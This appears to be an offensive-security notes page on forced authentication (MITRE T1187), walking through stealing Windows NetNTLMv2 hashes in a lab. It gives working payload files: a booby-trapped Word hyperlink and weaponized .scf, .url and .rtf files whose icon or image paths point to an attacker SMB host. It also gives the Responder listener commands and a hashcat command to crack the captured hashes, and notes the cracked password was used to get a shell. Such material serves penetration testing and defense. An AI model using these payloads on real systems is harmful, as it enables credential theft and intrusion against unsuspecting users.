---
description: 'Credential Access, Stealing hashes'
---

# T1187: Forced Authentication

## Execution via Hyperlink

Let's create a Word document that has a hyperlink to our attacking server where  `responder` will be listening on port 445:

![](../.gitbook/assets/forced-auth-word.png)

{% file src="../.gitbook/assets/totes-not-a-scam.docx" caption="Forced SMBv2 Authentication - MS Word File" %}

Let's start `Responder` on our kali box:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
responder -I eth1
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Once the link in the document is clicked, the target system sends an authentication request to the attacking host. Since responder is listening on the other end, victim's `NetNTLMv2` hash is captured:

![](../.gitbook/assets/forced-auth-hashes.png)

The retrieved hash can then be cracked offline with hashcat:

```csharp
hashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/share/wordlists/rockyou.txt --force
```

Success, the password is cracked:

![](../.gitbook/assets/forced-auth-cracked.png)

Using the cracked passsword to get a shell on the victim system:

![](../.gitbook/assets/forced-auth-shell%20%281%29.png)

## Execution via .SCF

Place the below `fa.scf` file on the attacker controlled machine at `10.0.0.7` in a shared folder `tools`

{% code-tabs %}
{% code-tabs-item title="\\\\10.0.0.7\\tools\\fa.scf" %}
```csharp
[Shell]
Command=2
IconFile=\\10.0.0.5\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% file src="../.gitbook/assets/fa.scf" caption="fa.scf" %}

A victim user `low` opens the share `\\10.0.0.7\tools` and the `fa.scf` gets executed automatically, which in turn forces the victim system to attempt to authenticate to the attacking system at 10.0.0.5 where responder is listening:

![victim opens \\10.0.0.7\tools, fa.scf executes and gives away low&apos;s hashes](../.gitbook/assets/forced-auth-shares.png)

![user&apos;s low hashes were received by the attacker](../.gitbook/assets/forced-auth-scf.png)

What's interesting with the `.scf` attack is that the file could easily be downloaded through the browser and as soon as the user navigates to the `Downloads` folder, users's hash is stolen:

![](../.gitbook/assets/forced-auth-downloads.png)

## Execution via .URL

Create a weaponized .url file and upload it to the victim system:

{% code-tabs %}
{% code-tabs-item title="c:\\link.url@victim" %}
```csharp
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.0.0.5\%USERNAME%.icon
IconIndex=1
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Create a listener on the attacking system:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```text
responder -I eth1 -v
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Once the victim navigates to the C:\ where `link.url` file is placed, the OS tries to authenticate to the attacker's malicious SMB listener on `10.0.0.5` where NetNTLMv2 hash is captured:

![](../.gitbook/assets/forced-authentication-url.gif)

## Execution via .RTF

Weaponizing .rtf file, which will attempt to load an image from the attacking system:

{% code-tabs %}
{% code-tabs-item title="file.rtf" %}
```csharp
{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://10.0.0.5/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Starting authentication listener on the attacking system:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```text
responder -I eth1 -v
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Executing the file.rtf on the victim system gives away user's hashes:

![](../.gitbook/assets/rtf-hashes.gif)

## References

{% embed url="http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf" %}

{% embed url="https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/" %}

{% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}

{% embed url="https://medium.com/@markmotig/a-better-way-to-capture-hashes-with-no-user-interaction-by-markmo-bd1569bfa208" %}

